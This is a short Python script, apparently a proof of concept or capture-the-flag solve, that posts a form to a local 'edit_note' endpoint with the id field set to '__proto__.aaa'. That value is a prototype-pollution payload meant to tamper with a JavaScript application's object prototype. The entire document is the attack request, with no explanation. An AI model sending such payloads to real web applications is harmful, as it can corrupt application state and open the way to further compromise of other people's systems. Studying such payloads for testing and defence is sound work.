import requests

url = "http://localhost:8080/edit_note"
data = {
    "id": "__proto__.aaa",
    "author": "1",
    "raw": "abc"
}
req = requests.post(url, data=data)
print(req)